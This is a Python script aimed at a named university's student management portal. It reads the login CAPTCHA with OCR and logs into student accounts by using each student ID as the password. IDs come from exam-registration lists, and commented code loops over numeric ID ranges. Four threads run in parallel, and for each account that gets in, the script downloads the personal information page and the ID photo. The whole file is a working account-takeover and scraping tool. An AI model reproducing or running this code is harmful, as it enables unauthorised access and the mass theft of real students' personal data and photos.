# -*- coding: utf-8 -*-
"""
Spyder Editor

This is a temporary script file.
"""





# -*- coding: utf-8 -*-

#s= []

import urllib
import re
import http.cookiejar
import sys
from PIL import Image
import pytesseract
from urllib.error import URLError, HTTPError
from bs4 import BeautifulStoneSoup

#pytesseract.pytesseract.tesseract_cmd = 'C:/Program Files (x86)/Tesseract-ORC/tesseract'
#pytesseract.pytesseract.tesseract_cmd = 'C:/Program Files/Tesseract-ORC/tesseract'

LONING_URL = 'http://szjy.swun.edu.cn/Sys/yhmm.aspx'
CAPTURE_URL= 'http://szjy.swun.edu.cn/Sys/default3.aspx' 
INFO_URL = 'http://szjy.swun.edu.cn/Sys/SystemForm/Class/MyStudent.aspx'
headers = {
            'Accept-Language': 'zh-CN,zh;q=0.8',
            'Connection': 'keep-alive',
            'Host':'szjy.swun.edu.cn',
            'Referer': 'http://szjy.swun.edu.cn/Sys/yhmm.aspx',
            'User-Agent':'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36',
            }
            
    
class Spyder(object):
    def __init__(self,img_name):
        self.login_url = LONING_URL
        self.info_url = INFO_URL
        self.enable = True
        self.count = 0
        self.img_name= img_name
        self.character = "gb2312"
        self.headers = headers
        self.cookie = http.cookiejar.CookieJar()
        self.hander = urllib.request.HTTPCookieProcessor(cookiejar=self.cookie)
        self.opener = urllib.request.build_opener(self.hander)
    
    def get_capture(self):
        captupe_url = CAPTURE_URL
        picture = self.opener.open(captupe_url).read()
        local = open(self.img_name,'wb')
        local.write(picture)
        local.close()
        im = Image.open(self.img_name)
        check_code = pytesseract.image_to_string(im)
        #check_code = input('输入验证码: ')
        #check_code = str(check_code)
        print("check code= ",check_code)
        return check_code
       
    def login(self,account,password):
         self.count+=1
         form_data={
            '__LASTFOCUS': '',
            '__VIEWSTATE': '/wEPDwUKLTYyODEyMzMzMGRkL3e45wwAbXRMklziclTsgEdzyPEwTYlRK/82rSW9ia4=',
            '__EVENTTARGET':'',
            '__EVENTARGUMENT': '',
            '__EVENTVALIDATION' :'/wEdAAU54OdiNscYklAhFFRo5mKvR1LBKX1P1xh290RQyTesRe73C5Hghb+Z/bZTMreJjC5a26FEoUIR27AQFJNWWcL9lvD3Xdq7ldHy+JQ2tBNJGaOgZ5o+9oUn7QAVYx4o/XgeS3eF3mvkRXiWGnMfaCgO',
            'UserName': account,
            'UserPass': password,
            'CheckCode': self.get_capture(),
            'Btn_OK': '(unable to decode value)',
                }
                
         data = urllib.parse.urlencode(form_data).encode(encoding='utf-8')
         resquest = urllib.request.Request(self.login_url, data, self.headers)
         response = self.opener.open(resquest)
         login_content = response.read().decode(self.character).encode("utf-8")
         ss = str((BeautifulStoneSoup(login_content)))
         '''
         if (len(ss)) > 4105:
              ss = ss.split('alert')[1]
              ss = ss.split(';')[0]
              print (ss)
              if ss == "('验证码输入错误！')":
                  if self.count is 1: 
                      self.cookie = self.cookie.clear()
                  return 1
              elif ss == "('用户名或密码错误！')":
                   #print ("用户名错误\n")
                   self.cookie = self.cookie.clear()
                   return 2
        '''
         #print(ss)
         if re.findall('验证码输入错误.',ss):
             print('验证码输入错误')
             if self.count is 1: 
                 self.cookie = self.cookie.clear()
                 return 1
         elif re.findall('用户名或密码错误.',ss):
             print('用户名或密码错误')
             self.cookie = self.cookie.clear()
             return 2
         else:
             return 3
         
         
    def get_info(self,account):
         request = urllib.request.Request(self.info_url)
         response = self.opener.open(request)
         content = response.read().decode(self.character).encode("utf-8")
         
         file = open('new/'+account+'.html','wb')
         file.write(content)
         file.close()
         
         detail_html = BeautifulStoneSoup(content)
         img_url = detail_html.find(id="Student11_Image1")
         link = img_url.get('src')
         link = link[2:]
         pto_url = 'http://szjy.swun.edu.cn/Sys/SystemForm'+link
         pto_url = pto_url.replace('照片','%D5%D5%C6%AC')
         urllib.request.install_opener(opener=self.opener)
         img_name = 'photos/'+account+'.jpg'
         urllib.request.urlretrieve(pto_url,img_name)
         self.cookie = self.cookie.clear()
         #return detail_html
         
    def extract_info(self,account):
        self.get_info(account=account)
        print("get :",account)

import pandas as pd

def ExtraData1():
    rest_list = pd.read_csv('gogogo.csv')['用户']
    print (rest_list)
    rest_list = list(rest_list)
    print(rest_list)
    return rest_list

def ExtraData():
    
    cet4_list = pd.read_excel('cet4.xls')['学号']
    kaoyan_list = pd.read_excel('kaoyan.xls')['学号']
    cet6_list = pd.read_csv('cet6.csv')['学号']
    already = pd.read_csv('already.csv',error_bad_lines=False)['学号']
    #print (already)
    cet4_list = list(cet4_list)
    kaoyan_list = list(kaoyan_list)
    cet6_list = list(cet6_list)
    already = list(already)
    target = cet4_list
    
    target.extend(kaoyan_list)
    target.extend(cet6_list)
    
    already = set(already)
    target = set(target)
    
    for item in already:
        if item in target:
            target.remove(item)
            
    
    print(len(target))
    return target
 

#uid_set = ExtraData1()
uid_set = [201431402087,201431402087,201431402087,201431402087,201431402087]
#for i in range(201431000000,201431099999):
    #uid_set.append(i)
uid_set = [str(x) for x in uid_set]
length = len(uid_set)
#uid_set = ['201431102141','201431102141','201430301141','201430301142','201430301012','201430301011','201431102086']

import threading
length = len(uid_set)
global get_people
get_people = 0

def thred1():
    print('thread1...')
    global get_people
    index1 = 0
    while(index1<=length):
        uid = uid_set[index1]
        index1 += 4    
        my_spy = Spyder('th1.jpg')
        print('用户:',uid)
        try:
            status = my_spy.login(uid,password=uid)
            print("status=",status)
        except:
            continue
        COUT = 0
        while(COUT<=10 and status is 1):
            COUT+=1
            try:
                status = my_spy.login(uid,uid)
                print("status yzx=",status)
            except:
                continue
        if status is 2:
           continue
        elif status is 3:
            try:
                my_spy.extract_info(account=uid)
                get_people+=1
                print('已爬取人数: ',get_people)
            except:
                continue
def thred2():
    print('thread2...')
    global get_people
    index2 = 1
    while(index2<length):
        uid = uid_set[index2]
        index2 += 4    
        my_spy = Spyder('th2.jpg')
        print('用户:',uid)
        try:
            status = my_spy.login(uid,password=uid)
            print("status=",status)
        except:
            continue
        COUT = 0
        while(COUT<=10 and status is 1):
            COUT+=1
            try:
                status = my_spy.login(uid,uid)
                print("status yzx=",status)
            except:
                continue
        if status is 2:
           continue
        elif status is 3:
            
            try:
                my_spy.extract_info(account=uid)
                get_people+=1
                print('已爬取人数: ',get_people)
            except:
                continue
def threa3():
    print('thread3...')
    global get_people
    index3 = 2
    while(index3<length):
        uid = uid_set[index3]
        index3 += 4  
        my_spy = Spyder('th3.jpg')
        print('用户:',uid)
        try:
            status = my_spy.login(uid,password=uid)
            print("status=",status)
        except:
            continue
        COUT = 0
        while(COUT<=10 and status is 1):
            COUT+=1
            try:
                status = my_spy.login(uid,uid)
                print("status yzx=",status)
            except:
                continue
        if status is 2:
           continue
        elif status is 3:
            try:
                my_spy.extract_info(account=uid)
                get_people+=1
                print('已爬取人数: ',get_people)
            except:
                continue
def threa4():
    print('thread4...')
    global get_people
    index4 = 3
    while(index4<length):
        uid = uid_set[index4]
        index4 += 4  
        my_spy = Spyder('th4.jpg')
        print('用户:',uid)
        try:
            status = my_spy.login(uid,password=uid)
            print("status=",status)
        except:
            continue
        COUT = 0
        while(COUT<=10 and status is 1):
            COUT+=1
            try:
                status = my_spy.login(uid,uid)
                print("status yzx=",status)
            except:
                continue
        if status is 2:
           continue
        elif status is 3:
            try:
                my_spy.extract_info(account=uid)
                get_people+=1
                print('已爬取人数: ',get_people)
            except:
                continue

if __name__=="__main__":
    thread = []
    t1 = threading.Thread(target=thred1)
    t2 = threading.Thread(target=thred2)
    t3 = threading.Thread(target=threa3)
    t4 = threading.Thread(target=threa4)
    
    thread = [t1,t2,t3,t4]
    for t in thread:
        #t.setDaemon(True)
        t.start()
    t.join()
    print('over')
    print('共爬取人数:',get_people)

'''
201430490481
uid_set = []
for i in range(201431105000,201431105799):
    uid_set.append(i)
uid_set = [str(x) for x in uid_set]
get_people = 0
if __name__=="__main__":
    global status
    for uid in uid_set:
        my_spy = Spyder('ma.jpg')
        print('用户:',uid)
        try:
            status = my_spy.login(uid,password=uid)
            print("status=",status)
        except:
            continue
        COUT = 0
        while(COUT<=5 and status is 1):
            COUT+=1
            try:
                status = my_spy.login(uid,uid)
                print("status yzx=",status)
            except:
                continue
        if status is 2:
           continue
        elif status is 3:
            get_people+=1
            print('已爬取人数: ',get_people)
            try:
                my_spy.extract_info(account=uid)
            except:
                continue
   
      
'''